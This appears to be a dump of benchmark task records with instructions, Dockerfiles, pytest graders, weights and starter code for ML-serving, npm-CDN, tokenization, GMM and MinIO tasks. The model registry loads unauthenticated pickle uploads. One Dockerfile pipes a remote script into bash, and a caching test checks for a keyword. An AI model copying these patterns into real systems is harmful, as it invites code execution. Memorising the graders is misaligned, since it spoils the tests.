RUN apt-get update && apt-get install -y python3 python3-pip python3-dev gcc g++ && rm -rf /var/lib/apt/lists/*

# Copy requirements and install dependencies
COPY requirements.txt /app/
RUN pip3 install --break-system-packages -r requirements.txt

# Create model registry directory
RUN mkdir -p /app/model_registry

# Copy application files
COPY registry_server.py /app/
COPY serving_endpoint.py /app/
COPY push_model.py /app/
COPY train_sample_model.py /app/

# Make CLI tools executable
RUN chmod +x /app/push_model.py
RUN chmod +x /app/train_sample_model.py

# Start both services in background (registry on 5000, serving on 8000)
RUN echo '#!/bin/bash\npython3 /app/registry_server.py &\nuvicorn serving_endpoint:app --host 0.0.0.0 --port 8000 &\nwait' > /app/start_services.sh
RUN chmod +x /app/start_services.sh

# Expose ports
EXPOSE 5000 8000","import subprocess
import time
import json
import os

def test_model_push_creates_version():
    """"""Test that pushing a model creates a new version in the registry""""""
    # First train a sample model
    subprocess.run(['python3', '/app/train_sample_model.py'], check=True)
    
    # Push the model
    result = subprocess.run(['python3', '/app/push_model.py', 'sample_model.pkl'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert 'Version: v1' in result.stdout
    
    # Verify registry has the model
    response = subprocess.run(['curl', '-s', 'http://localhost:5000/models'], 
                            capture_output=True, text=True)
    data = json.loads(response.stdout)
    assert 'v1' in data['models']
    assert data['current_version'] == 'v1'

def test_serving_endpoint_auto_updates():
    """"""Test that serving endpoint automatically loads new model versions within 10 seconds""""""
    # Train and push initial model
    subprocess.run(['python3', '/app/train_sample_model.py'], check=True)
    subprocess.run(['python3', '/app/push_model.py', 'sample_model.pkl'], check=True)
    
    # Wait a bit for initial load
    time.sleep(2)
    
    # Check current version
    response = subprocess.run(['curl', '-s', 'http://localhost:8000/model/info'], 
                            capture_output=True, text=True)
    initial_info = json.loads(response.stdout)
    
    # Train a new model with different weights
    subprocess.run(['python3', '-c', '''
import pickle
from sklearn.linear_model import LinearRegression
import numpy as np
X = np.random.rand(100, 3)
y = X[:, 0] * 10 + X[:, 1] * 20 + X[:, 2] * 30
model = LinearRegression()
model.fit(X, y)
with open(""model_v2.pkl"", ""wb"") as f:
    pickle.dump(model, f)
'''], check=True)
    
    # Push the new model
    subprocess.run(['python3', '/app/push_model.py', 'model_v2.pkl'], check=True)
    
    # Wait up to 10 seconds for auto-update
    updated = False
    for i in range(10):
        time.sleep(1)
        response = subprocess.run(['curl', '-s', 'http://localhost:8000/model/info'], 
                                capture_output=True, text=True)
        current_info = json.loads(response.stdout)
        if current_info['current_version'] == 'v2':
            updated = True
            break
    
    assert updated, ""Serving endpoint did not auto-update to new model version within 10 seconds""","{""test_model_push_creates_version"": 0.3, ""test_serving_endpoint_auto_updates"": 0.7}","{""serving_endpoint.py"": ""from fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nimport pickle\nimport json\nimport os\nfrom pathlib import Path\nimport threading\nimport time\n\napp = FastAPI()\n\nREGISTRY_PATH = Path(\""/app/model_registry\"")\nMETADATA_FILE = REGISTRY_PATH / \""metadata.json\""\ncurrent_model = None\ncurrent_version = None\n\nclass PredictionRequest(BaseModel):\n    features: list\n\nclass PredictionResponse(BaseModel):\n    prediction: float\n    model_version: str\n\ndef load_metadata():\n    if METADATA_FILE.exists():\n        with open(METADATA_FILE, 'r') as f:\n            return json.load(f)\n    return {\""models\"": {}, \""current_version\"": None}\n\ndef load_latest_model():\n    global current_model, current_version\n    metadata = load_metadata()\n    \n    if metadata[\""current_version\""]:\n        version = metadata[\""current_version\""]\n        model_path = metadata[\""models\""][version][\""path\""]\n        \n        if os.path.exists(model_path):\n            with open(model_path, 'rb') as f:\n                current_model = pickle.load(f)\n            current_version = version\n            print(f\""Loaded model version: {version}\"")\n\ndef check_for_updates():\n    \""\""\""Background thread to check for model updates\""\""\""\n    while True:\n        time.sleep(5)  # Check every 5 seconds\n        try:\n            metadata = load_metadata()\n            if metadata[\""current_version\""] and metadata[\""current_version\""] != current_version:\n                print(f\""New model version detected: {metadata['current_version']}\"")\n                load_latest_model()\n        except Exception as e:\n            print(f\""Error checking for updates: {e}\"")\n\n@app.on_event(\""startup\"")\ndef startup_event():\n    # Load initial model if available\n    load_latest_model()\n    \n    # Start background thread for auto-updates\n    update_thread = threading.Thread(target=check_for_updates, daemon=True)\n    update_thread.start()\n\n@app.get(\""/\"")\ndef health_check():\n    return {\""status\"": \""healthy\"", \""current_version\"": current_version}\n\n@app.post(\""/predict\"", response_model=PredictionResponse)\ndef predict(request: PredictionRequest):\n    if current_model is None:\n        raise HTTPException(status_code=503, detail=\""No model loaded\"")\n    \n    # Make prediction\n    prediction = current_model.predict([request.features])[0]\n    \n    return PredictionResponse(\n        prediction=float(prediction),\n        model_version=current_version\n    )\n\n@app.get(\""/model/info\"")\ndef model_info():\n    metadata = load_metadata()\n    return {\n        \""current_version\"": current_version,\n        \""available_versions\"": list(metadata[\""models\""].keys()),\n        \""model_count\"": len(metadata[\""models\""])\n    }"", ""requirements.txt"": ""flask==3.0.0\nfastapi==0.104.1\nuvicorn==0.24.0\nscikit-learn\nnumpy\nrequests==2.31.0\npydantic==2.5.0\npytest"", ""train_sample_model.py"": ""#!/usr/bin/env python3\n\""\""\""Train a simple model for testing\""\""\""\nimport pickle\nfrom sklearn.linear_model import LinearRegression\nimport numpy as np\n\n# Generate some sample data\nX = np.random.rand(100, 3)\ny = X[:, 0] * 2 + X[:, 1] * 3 + X[:, 2] * 4 + np.random.randn(100) * 0.1\n\n# Train model\nmodel = LinearRegression()\nmodel.fit(X, y)\n\n# Save model\nwith open('sample_model.pkl', 'wb') as f:\n    pickle.dump(model, f)\n\nprint(\""Sample model trained and saved to sample_model.pkl\"")"", ""registry_server.py"": ""import os\nimport json\nimport time\nfrom datetime import datetime\nfrom pathlib import Path\nfrom flask import Flask, request, jsonify\nimport shutil\n\napp = Flask(__name__)\n\nREGISTRY_PATH = Path(\""/app/model_registry\"")\nMETADATA_FILE = REGISTRY_PATH / \""metadata.json\""\n\ndef load_metadata():\n    if METADATA_FILE.exists():\n        with open(METADATA_FILE, 'r') as f:\n            return json.load(f)\n    return {\""models\"": {}, \""current_version\"": None}\n\ndef save_metadata(metadata):\n    with open(METADATA_FILE, 'w') as f:\n        json.dump(metadata, f, indent=2)\n\n@app.route('/push', methods=['POST'])\ndef push_model():\n    if 'model' not in request.files:\n        return jsonify({\""error\"": \""No model file provided\""}), 400\n    \n    model_file = request.files['model']\n    metadata = load_metadata()\n    \n    # Generate new version\n    versions = list(metadata[\""models\""].keys())\n    if versions:\n        last_version = max([int(v.replace(\""v\"", \""\"")) for v in versions])\n        new_version = f\""v{last_version + 1}\""\n    else:\n        new_version = \""v1\""\n    \n    # Save model\n    model_dir = REGISTRY_PATH / new_version\n    model_dir.mkdir(parents=True, exist_ok=True)\n    model_path = model_dir / \""model.pkl\""\n    model_file.save(str(model_path))\n    \n    # Update metadata\n    metadata[\""models\""][new_version] = {\n        \""timestamp\"": datetime.now().isoformat(),\n        \""path\"": str(model_path)\n    }\n    metadata[\""current_version\""] = new_version\n    save_metadata(metadata)\n    \n    return jsonify({\""version\"": new_version, \""status\"": \""success\""})\n\n@app.route('/models', methods=['GET'])\ndef list_models():\n    metadata = load_metadata()\n    return jsonify(metadata)\n\nif __name__ == '__main__':\n    REGISTRY_PATH.mkdir(parents=True, exist_ok=True)\n    app.run(host='0.0.0.0', port=5000)"", ""push_model.py"": ""#!/usr/bin/env python3\nimport argparse\nimport pickle\nimport requests\nimport sys\nfrom pathlib import Path\n\ndef push_model(model_path, registry_url=\""http://localhost:5000\""):\n    \""\""\""Push a model to the registry\""\""\""\n    if not Path(model_path).exists():\n        print(f\""Error: Model file not found: {model_path}\"")\n        return False\n    \n    with open(model_path, 'rb') as f:\n        files = {'model': f}\n        response = requests.post(f\""{registry_url}/push\"", files=files)\n    \n    if response.status_code == 200:\n        data = response.json()\n        print(f\""Model pushed successfully!\"")\n        print(f\""Version: {data['version']}\"")\n        return True\n    else:\n        print(f\""Error pushing model: {response.text}\"")\n        return False\n\nif __name__ == \""__main__\"":\n    parser = argparse.ArgumentParser(description=\""Push a model to the ML registry\"")\n    parser.add_argument(\""model_path\"", help=\""Path to the pickled model file\"")\n    parser.add_argument(\""--registry-url\"", default=\""http://localhost:5000\"", \n                        help=\""URL of the registry server\"")\n    \n    args = parser.parse_args()\n    \n    success = push_model(args.model_path, args.registry_url)\n    sys.exit(0 if success else 1)""}",2025-07-21T17:10:47.102438,2025-07-22T15:11:27.371509+00:00
draft_dp_036285b2,medium,draft_dp_036285b2,system-administration,The npm registry is set up but packages aren't being distributed to the CDN after publishing. Fix the automation so published packages are available at localhost/packagename@version/ within 30 seconds.,system-administration,automation|package-management|web-server,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js, npm, and other dependencies
RUN apt-get update && apt-get install -y \
    curl \
    nginx \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y nodejs \
    && npm install -g verdaccio@5.31.1 \
    && apt-get clean

# Create necessary directories
RUN mkdir -p /verdaccio/storage /verdaccio/plugins /cdn /app /etc/verdaccio

# Copy configuration files
COPY verdaccio-config.yaml /etc/verdaccio/config.yaml
COPY nginx.conf /etc/nginx/nginx.conf

# Set up htpasswd for test user
RUN npm install -g htpasswd \
    && htpasswd -cb /verdaccio/htpasswd testuser testpass

# Copy the package watcher
COPY package-watcher.js /app/

# Install dependencies for watcher
WORKDIR /app
RUN npm init -y && npm install chokidar

# Copy test package
COPY test-package /home/user/test-package

# Copy and set up startup script
COPY startup.sh /startup.sh
RUN chmod +x /startup.sh

# Set npm registry to local
RUN npm config set registry http://localhost:4873/

WORKDIR /home/user

# Start services
CMD [""/startup.sh""]","import subprocess
import time
import os
import json

def test_package_available_on_cdn():
    """"""Test that published package is available on CDN with correct structure""""""
    # Check if test-module@1.0.0 is available on CDN
    result = subprocess.run(
        ['curl', '-s', 'http://localhost/test-module@1.0.0/index.js'],
        capture_output=True,
        text=True
    )
    
    # Should return the actual content of index.js
    assert result.returncode == 0
    assert 'module.exports' in result.stdout
    assert 'Hello' in result.stdout
    
def test_package_json_accessible():
    """"""Test that package.json is accessible via CDN""""""
    result = subprocess.run(
        ['curl', '-s', 'http://localhost/test-module@1.0.0/package.json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    # Parse and verify it's valid JSON with correct content
    try:
        package_data = json.loads(result.stdout)
        assert package_data['name'] == 'test-module'
        assert package_data['version'] == '1.0.0'
    except:
        assert False, ""Failed to parse package.json from CDN""","{""test_package_available_on_cdn"": 0.6, ""test_package_json_accessible"": 0.4}","{""verdaccio-config.yaml"": ""storage: /verdaccio/storage\nplugins: /verdaccio/plugins\n\nweb:\n  title: Private NPM Registry\n  \nauth:\n  htpasswd:\n    file: /verdaccio/htpasswd\n\nuplinks:\n  npmjs:\n    url: https://registry.npmjs.org/\n\npackages:\n  '@*/*':\n    access: $all\n    publish: $authenticated\n    unpublish: $authenticated\n    proxy: npmjs\n\n  '**':\n    access: $all\n    publish: $authenticated\n    unpublish: $authenticated\n    proxy: npmjs\n\nserver:\n  keepAliveTimeout: 60\n\nmiddlewares:\n  audit:\n    enabled: true\n\nlogs:\n  - {type: file, path: /verdaccio/verdaccio.log, level: info}\n\nlisten: 0.0.0.0:4873"", ""package-watcher.js"": ""const fs = require('fs');\nconst path = require('path');\nconst chokidar = require('chokidar');\n\nconst STORAGE_PATH = '/verdaccio/storage';\nconst CDN_PATH = '/cdn';\nconst WATCH_PATTERN = `${STORAGE_PATH}/*/*.tgz`;\n\nconsole.log('Package watcher started but not processing new packages...');\nconsole.log(`Watching: ${WATCH_PATTERN}`);\n\n// Watch for new tgz files but don't process them\nconst watcher = chokidar.watch(WATCH_PATTERN, {\n  persistent: true,\n  ignoreInitial: true\n});\n\nwatcher.on('add', (filePath) => {\n  console.log(`New package detected: ${filePath}`);\n  // Processing disabled - automation needs to be implemented\n});\n\nwatcher.on('error', error => console.error('Watcher error:', error));"", ""startup.sh"": ""#!/bin/bash\n\n# Start nginx\nnginx -g \""daemon off;\"" &\n\n# Start Verdaccio\nverdaccio --config /etc/verdaccio/config.yaml &\n\n# Start the package watcher (currently not processing packages)\ncd /app && node package-watcher.js &\n\n# Keep container running\nwait"", ""nginx.conf"": ""events {\n    worker_connections 1024;\n}\n\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    server {\n        listen 80;\n        server_name cdn.local;\n        root /cdn;\n\n        location / {\n            autoindex on;\n            add_header Access-Control-Allow-Origin *;\n            add_header Cache-Control \""public, max-age=3600\"";\n        }\n\n        location ~ ^/([^/]+)@([^/]+)/(.*)$ {\n            alias /cdn/$1/$2/$3;\n            add_header Access-Control-Allow-Origin *;\n            add_header Cache-Control \""public, max-age=3600\"";\n        }\n    }\n}"", ""test-package/index.js"": ""module.exports = {\n  greet: function(name) {\n    return `Hello, ${name}!`;\n  },\n  version: '1.0.0'\n};"", ""test-package/package.json"": ""{\n  \""name\"": \""test-module\"",\n  \""version\"": \""1.0.0\"",\n  \""description\"": \""Test package for CDN distribution\"",\n  \""main\"": \""index.js\"",\n  \""scripts\"": {\n    \""test\"": \""echo \\\""Error: no test specified\\\"" && exit 1\""\n  },\n  \""author\"": \""\"",\n  \""license\"": \""MIT\""\n}""}",2025-07-21T19:03:23.705970,2025-07-22T15:22:55.791091+00:00
draft_dp_89c12f26,medium,draft_dp_89c12f26,data-processing,"Need to analyze the support dialogues in dialogues.csv - tokenize each turn with DialoGPT, calculate stats by role (customer vs agent), and output to /app/dialogue_stats.json.",data-processing,python|data-processing|machine-learning,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install transformers pandas

# Copy dialogue data
COPY dialogues.csv /app/dialogues.csv

# Copy a partially working script that needs fixing
COPY analyze_dialogues.py /app/analyze_dialogues.py

CMD [""/bin/bash""]","import os
import json

def test_dialogue_stats_file_exists():
    """"""Test that the dialogue stats JSON file was created.""""""
    assert os.path.exists('/app/dialogue_stats.json'), ""dialogue_stats.json file not found""

def test_dialogue_stats_structure_and_values():
    """"""Test that the JSON has correct structure and reasonable values.""""""
    with open('/app/dialogue_stats.json', 'r') as f:
        stats = json.load(f)
    
    # Check required keys exist
    assert 'customer' in stats, ""Missing 'customer' key in stats""
    assert 'agent' in stats, ""Missing 'agent' key in stats""
    assert 'conversation_stats' in stats, ""Missing 'conversation_stats' key in stats""
    
    # Check customer stats
    assert 'total_tokens' in stats['customer'], ""Missing total_tokens for customer""
    assert 'avg_tokens_per_turn' in stats['customer'], ""Missing avg_tokens_per_turn for customer""
    assert 'turn_count' in stats['customer'], ""Missing turn_count for customer""
    
    # Check values are reasonable
    assert stats['customer']['total_tokens'] > 100, ""Customer total tokens too low""
    assert stats['agent']['total_tokens'] > 100, ""Agent total tokens too low""
    assert 10 <= stats['customer']['avg_tokens_per_turn'] <= 100, ""Customer avg tokens per turn out of range""
    assert 10 <= stats['agent']['avg_tokens_per_turn'] <= 100, ""Agent avg tokens per turn out of range""
    
    # Check conversation stats
    assert stats['conversation_stats']['total_conversations'] == 5, ""Should have 5 conversations""
    assert 3 <= stats['conversation_stats']['avg_length_turns'] <= 10, ""Average conversation length out of expected range""","{""test_dialogue_stats_file_exists"": 0.3, ""test_dialogue_stats_structure_and_values"": 0.7}","{""analyze_dialogues.py"": ""#!/usr/bin/env python3\nimport pandas as pd\nimport json\nfrom transformers import AutoTokenizer\n\ndef analyze_dialogues():\n    # Load the dialogue data\n    df = pd.read_csv('dialogues.csv')\n    \n    # Initialize DialoGPT tokenizer\n    tokenizer = AutoTokenizer.from_pretrained('microsoft/DialoGPT-medium')\n    \n    # Initialize counters\n    customer_tokens = 0\n    agent_tokens = 0\n    customer_turns = 0\n    agent_turns = 0\n    \n    # Process each message\n    for _, row in df.iterrows():\n        tokens = tokenizer.encode(row['message'])\n        \n        if row['speaker'] == 'customer':\n            # TODO: Add token counting for customer\n            pass\n        else:\n            # TODO: Add token counting for agent  \n            pass\n    \n    # Calculate conversation statistics\n    conversation_ids = df['conversation_id'].unique()\n    \n    # TODO: Calculate average conversation length\n    # TODO: Create proper output structure\n    # TODO: Write to /app/dialogue_stats.json\n    \n    print(\""Analysis complete!\"")\n\nif __name__ == \""__main__\"":\n    analyze_dialogues()"", ""dialogues.csv"": ""conversation_id,turn_number,speaker,message\nconv_001,1,customer,\""Hello, I'm having trouble installing Ubuntu on my laptop. It keeps freezing during the installation process.\""\nconv_001,2,agent,\""I can help you with that. Can you tell me which version of Ubuntu you're trying to install and what laptop model you have?\""\nconv_001,3,customer,\""I'm trying to install Ubuntu 22.04 LTS on a Dell XPS 13. It freezes right after I select the language.\""\nconv_001,4,agent,\""This might be a graphics driver issue. Try pressing 'e' at the GRUB menu and add 'nomodeset' to the boot parameters. This will use basic graphics drivers during installation.\""\nconv_001,5,customer,\""How exactly do I do that? I'm not very familiar with GRUB.\""\nconv_001,6,agent,\""When you boot from the USB, you'll see a menu. Press 'e' when 'Try Ubuntu' is highlighted. Find the line starting with 'linux' and add 'nomodeset' at the end, then press F10 to boot.\""\nconv_001,7,customer,\""Okay, I'll try that. Thanks for the help!\""\nconv_002,1,customer,\""My WiFi isn't working after upgrading to Ubuntu 23.10\""\nconv_002,2,agent,\""Let's diagnose this. Can you open a terminal and run 'lspci | grep -i network' to see what WiFi adapter you have?\""\nconv_002,3,customer,\""It shows: Network controller: Intel Corporation Wi-Fi 6 AX200\""\nconv_002,4,agent,\""The AX200 should work out of the box. Try running 'sudo dmesg | grep iwlwifi' to check for firmware errors.\""\nconv_002,5,customer,\""I see some errors about firmware not loading correctly\""\nconv_002,6,agent,\""Let's reinstall the firmware. Run: sudo apt update && sudo apt install --reinstall linux-firmware\""\nconv_003,1,customer,\""How do I install Docker on Ubuntu?\""\nconv_003,2,agent,\""I'll guide you through the official installation. First, update your package index: sudo apt update\""\nconv_003,3,customer,\""Done. What's next?\""\nconv_003,4,agent,\""Now install prerequisites: sudo apt install apt-transport-https ca-certificates curl software-properties-common\""\nconv_003,5,customer,\""Installed. Should I add the Docker repository?\""\nconv_003,6,agent,\""Yes, add Docker's GPG key first: curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\""\nconv_003,7,customer,\""Added the key successfully\""\nconv_003,8,agent,\""Great! Now add the repository and install Docker. After that, don't forget to add your user to the docker group with: sudo usermod -aG docker ${USER}\""\nconv_004,1,customer,\""Ubuntu won't boot after update, stuck at black screen\""\nconv_004,2,agent,\""Can you access the GRUB menu by holding Shift during boot? We might need to boot into recovery mode.\""\nconv_004,3,customer,\""Yes, I can see GRUB. Should I select recovery mode?\""\nconv_004,4,agent,\""Yes, select recovery mode for your current kernel version. Once in the recovery menu, choose 'root - Drop to root shell prompt'\""\nconv_004,5,customer,\""I'm at the root prompt now\""\nconv_004,6,agent,\""Good. Let's try to fix the graphics drivers. Run: ubuntu-drivers autoinstall\""\nconv_005,1,customer,\""How can I check which ports are open on my Ubuntu server?\""\nconv_005,2,agent,\""You can use several tools. The quickest is: sudo ss -tlnp\""\nconv_005,3,customer,\""What do the flags mean?\""\nconv_005,4,agent,\""-t shows TCP ports, -l shows listening ports, -n shows port numbers instead of service names, -p shows the process using the port\""\nconv_005,5,customer,\""I see port 8080 is open but I don't recognize the service\""\nconv_005,6,agent,\""Check what's using it with: sudo lsof -i :8080\""""}",2025-07-21T19:07:33.071721,2025-07-21T19:07:33.071721
draft_dp_f1973442,medium,draft_dp_f1973442,machine-learning,Need to implement EM algorithm for customer segmentation with GMM. Must include caching for likelihood calculations to achieve >4x speedup on 1000+ points.,machine-learning,python|caching|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install numpy scipy matplotlib pandas

# Copy application files
COPY gmm.py /app/
COPY generate_data.py /app/

# Generate customer data
RUN python generate_data.py","import subprocess
import sys
import time
import numpy as np
import pandas as pd

def test_em_convergence():
    """"""Test that EM algorithm converges and correctly clusters the data""""""
    # Run a test script to check if GMM implementation works
    test_code = """"""
import sys
sys.path.append('/app')
from gmm import GaussianMixture
import pandas as pd
import numpy as np

# Load data
df = pd.read_csv('/app/customer_data.csv')
X = df[['purchase_frequency', 'avg_order_value', 'customer_lifetime_value']].values
y_true = df['true_segment'].values

# Normalize features
X_normalized = (X - X.mean(axis=0)) / X.std(axis=0)

# Fit GMM
gmm = GaussianMixture(n_components=3, max_iter=100)
gmm.fit(X_normalized)

# Check convergence
if not gmm.converged_:
    print(""FAILED: Model did not converge"")
    sys.exit(1)

# Predict clusters
labels = gmm.predict(X_normalized)

# Check that we have 3 distinct clusters
n_clusters = len(np.unique(labels))
if n_clusters != 3:
    print(f""FAILED: Expected 3 clusters, got {n_clusters}"")
    sys.exit(1)

# Check clustering quality - at least 70% accuracy
# Map predicted labels to true labels
from scipy.stats import mode
mapping = {}
for i in range(3):
    mask = labels == i
    if mask.sum() > 0:
        mapping[i] = mode(y_true[mask])[0][0]

mapped_labels = np.array([mapping.get(l, -1) for l in labels])
accuracy = (mapped_labels == y_true).mean()

if accuracy < 0.7:
    print(f""FAILED: Clustering accuracy {accuracy:.2f} is below 70%"")
    sys.exit(1)

print(f""SUCCESS: Model converged in {gmm.n_iter_} iterations with {accuracy:.2f} accuracy"")
""""""
    
    result = subprocess.run([sys.executable, '-c', test_code], 
                          capture_output=True, text=True, cwd='/app')
    
    assert result.returncode == 0, f""EM convergence test failed: {result.stderr}""
    assert ""SUCCESS"" in result.stdout, f""EM convergence test failed: {result.stdout}""

def test_caching_speedup():
    """"""Test that caching provides >4x speedup on 1000+ points""""""
    test_code = """"""
import sys
sys.path.append('/app')
from gmm import GaussianMixture
import pandas as pd
import numpy as np
import time

# Load and prepare data
df = pd.read_csv('/app/customer_data.csv')
X = df[['purchase_frequency', 'avg_order_value', 'customer_lifetime_value']].values
X_normalized = (X - X.mean(axis=0)) / X.std(axis=0)

# Ensure we have 1000+ points
assert len(X) >= 1000, f""Need at least 1000 points, got {len(X)}""

# First, check if caching is implemented by looking for cache-related attributes or methods
gmm = GaussianMixture(n_components=3)
gmm._initialize_parameters(X_normalized)

# Try to detect if caching is implemented
has_cache = False
if hasattr(gmm, '_cache') or hasattr(gmm, 'cache') or hasattr(gmm, '_likelihood_cache'):
    has_cache = True
    
# Check in methods for caching logic
import inspect
e_step_source = inspect.getsource(gmm._e_step)
if 'cache' in e_step_source.lower():
    has_cache = True

if not has_cache:
    print(""FAILED: No caching implementation detected"")
    sys.exit(1)

# Measure performance with likelihood calculations
# Simulate multiple E-step calls to test caching
gmm.fit(X_normalized[:100])  # Fit on small subset first

# Time multiple likelihood calculations
start_time = time.time()
for _ in range(10):
    gmm._e_step(X_normalized)
time_with_cache = time.time() - start_time

# Create a version without cache (simulate by clearing any cache between calls)
class GaussianMixtureNoCache(GaussianMixture):
    def _e_step(self, X):
        # Clear any cache-like attributes
        for attr in dir(self):
            if 'cache' in attr.lower() and hasattr(self, attr):
                if isinstance(getattr(self, attr), dict):
                    getattr(self, attr).clear()
        return super()._e_step(X)

gmm_no_cache = GaussianMixtureNoCache(n_components=3)
gmm_no_cache.means_ = gmm.means_
gmm_no_cache.covariances_ = gmm.covariances_
gmm_no_cache.weights_ = gmm.weights_

start_time = time.time()
for _ in range(10):
    gmm_no_cache._e_step(X_normalized)
time_no_cache = time.time() - start_time

# Calculate speedup
speedup = time_no_cache / time_with_cache if time_with_cache > 0 else 0

if speedup < 4.0:
    print(f""FAILED: Caching speedup is {speedup:.2f}x, expected >4x"")
    sys.exit(1)

print(f""SUCCESS: Caching provides {speedup:.2f}x speedup"")
""""""
    
    result = subprocess.run([sys.executable, '-c', test_code],
                          capture_output=True, text=True, cwd='/app')
    
    assert result.returncode == 0, f""Caching speedup test failed: {result.stderr}""
    assert ""SUCCESS"" in result.stdout, f""Caching speedup test failed: {result.stdout}""","{""test_em_convergence"": 0.6, ""test_caching_speedup"": 0.4}","{""gmm.py"": ""import numpy as np\nfrom scipy.stats import multivariate_normal\nimport time\n\nclass GaussianMixture:\n    def __init__(self, n_components=3, max_iter=100, tol=1e-4):\n        self.n_components = n_components\n        self.max_iter = max_iter\n        self.tol = tol\n        self.converged_ = False\n        self.n_iter_ = 0\n        self._likelihood_cache = {}\n        \n    def _initialize_parameters(self, X):\n        n_samples, n_features = X.shape\n        \n        # Random initialization\n        indices = np.random.choice(n_samples, self.n_components, replace=False)\n        self.means_ = X[indices]\n        \n        self.covariances_ = np.array([np.eye(n_features) for _ in range(self.n_components)])\n        self.weights_ = np.ones(self.n_components) / self.n_components\n        \n    def _compute_likelihoods(self, X, component_idx):\n        \""\""\""Compute likelihood with caching\""\""\""\n        # Create cache key based on component parameters\n        cache_key = (\n            tuple(self.means_[component_idx].flatten()),\n            tuple(self.covariances_[component_idx].flatten()),\n            tuple(X.flatten())\n        )\n        \n        if cache_key in self._likelihood_cache:\n            return self._likelihood_cache[cache_key]\n        \n        # Compute likelihood\n        likelihood = multivariate_normal.pdf(\n            X, \n            mean=self.means_[component_idx], \n            cov=self.covariances_[component_idx]\n        )\n        \n        # Store in cache\n        self._likelihood_cache[cache_key] = likelihood\n        return likelihood\n        \n    def _e_step(self, X):\n        \""\""\""Calculate responsibilities with caching\""\""\""\n        n_samples = X.shape[0]\n        likelihoods = np.zeros((n_samples, self.n_components))\n        \n        for k in range(self.n_components):\n            likelihoods[:, k] = self.weights_[k] * self._compute_likelihoods(X, k)\n            \n        # Normalize to get responsibilities\n        total = likelihoods.sum(axis=1, keepdims=True)\n        responsibilities = likelihoods / (total + 1e-10)  # Add small value to prevent division by zero\n        \n        return responsibilities\n    \n    def _m_step(self, X, responsibilities):\n        \""\""\""Update parameters\""\""\""\n        n_samples = X.shape[0]\n        \n        # Clear cache when parameters change\n        self._likelihood_cache.clear()\n        \n        # Update weights\n        Nk = responsibilities.sum(axis=0)\n        self.weights_ = Nk / n_samples\n        \n        # Update means\n        self.means_ = (responsibilities.T @ X) / Nk[:, np.newaxis]\n        \n        # Update covariances\n        for k in range(self.n_components):\n            diff = X - self.means_[k]\n            weighted_diff = responsibilities[:, k:k+1] * diff\n            self.covariances_[k] = (diff.T @ weighted_diff) / Nk[k]\n            # Add small value to diagonal for numerical stability\n            self.covariances_[k] += np.eye(X.shape[1]) * 1e-6\n        \n    def _compute_log_likelihood(self, X):\n        \""\""\""Compute log likelihood\""\""\""\n        n_samples = X.shape[0]\n        likelihoods = np.zeros((n_samples, self.n_components))\n        \n        for k in range(self.n_components):\n            likelihoods[:, k] = self.weights_[k] * self._compute_likelihoods(X, k)\n            \n        return np.log(likelihoods.sum(axis=1) + 1e-10).sum()\n        \n    def fit(self, X):\n        \""\""\""Fit the model\""\""\""\n        self._initialize_parameters(X)\n        \n        prev_log_likelihood = -np.inf\n        \n        for i in range(self.max_iter):\n            # E-step\n            responsibilities = self._e_step(X)\n            \n            # M-step  \n            self._m_step(X, responsibilities)\n            \n            # Check convergence\n            log_likelihood = self._compute_log_likelihood(X)\n            \n            if abs(log_likelihood - prev_log_likelihood) < self.tol:\n                self.converged_ = True\n                self.n_iter_ = i + 1\n                break\n                \n            prev_log_likelihood = log_likelihood\n            self.n_iter_ = i + 1\n            \n        return self\n        \n    def predict(self, X):\n        \""\""\""Predict cluster labels\""\""\""\n        responsibilities = self._e_step(X)\n        return np.argmax(responsibilities, axis=1)"", ""generate_data.py"": ""import numpy as np\nimport pandas as pd\n\ndef generate_customer_data(n_samples=1500, n_clusters=3, random_state=42):\n    \""\""\""Generate synthetic customer segmentation data\""\""\""\n    np.random.seed(random_state)\n    \n    # Define cluster centers for customer segments\n    centers = np.array([\n        [10, 50, 500],    # Low frequency, low value, low CLV\n        [30, 150, 2000],  # Medium frequency, medium value, medium CLV  \n        [50, 300, 5000]   # High frequency, high value, high CLV\n    ])\n    \n    # Generate data\n    X = []\n    y_true = []\n    \n    samples_per_cluster = n_samples // n_clusters\n    \n    for i in range(n_clusters):\n        # Add some variance to each cluster\n        cluster_data = centers[i] + np.random.randn(samples_per_cluster, 3) * [3, 20, 200]\n        X.append(cluster_data)\n        y_true.extend([i] * samples_per_cluster)\n    \n    X = np.vstack(X)\n    y_true = np.array(y_true)\n    \n    # Shuffle\n    indices = np.random.permutation(len(X))\n    X = X[indices]\n    y_true = y_true[indices]\n    \n    # Create DataFrame\n    df = pd.DataFrame(X, columns=['purchase_frequency', 'avg_order_value', 'customer_lifetime_value'])\n    df['true_segment'] = y_true\n    \n    return df\n\nif __name__ == \""__main__\"":\n    # Generate and save data\n    df = generate_customer_data()\n    df.to_csv('customer_data.csv', index=False)\n    print(f\""Generated {len(df)} customer records with {df['true_segment'].nunique()} segments\"")""}",2025-07-21T19:07:46.395398,2025-07-22T15:27:55.555023+00:00
draft_dp_d71b7909,medium,draft_dp_d71b7909,system-administration,Set up MinIO with a public bucket that allows anonymous downloads. The bucket should reject uploads without auth but allow anyone to download files via direct URLs.,system-administration,cloud|security|api,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /workspace

# Install required packages
RUN apt-get update && apt-get install -y wget curl && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Install MinIO server and client
RUN wget https://dl.min.io/server/minio/release/linux-amd64/minio && \
    chmod +x minio && \
    mv minio /usr/local/bin/ && \
    wget https://dl.min.io/client/mc/release/linux-amd64/mc && \
    chmod +x mc && \
    mv mc /usr/local/bin/

# Copy setup files
COPY setup_minio.sh /workspace/
COPY test_data.txt /workspace/

# Set up MinIO data directory
RUN mkdir -p /workspace/minio-data

# Make setup script executable
RUN chmod +x /workspace/setup_minio.sh

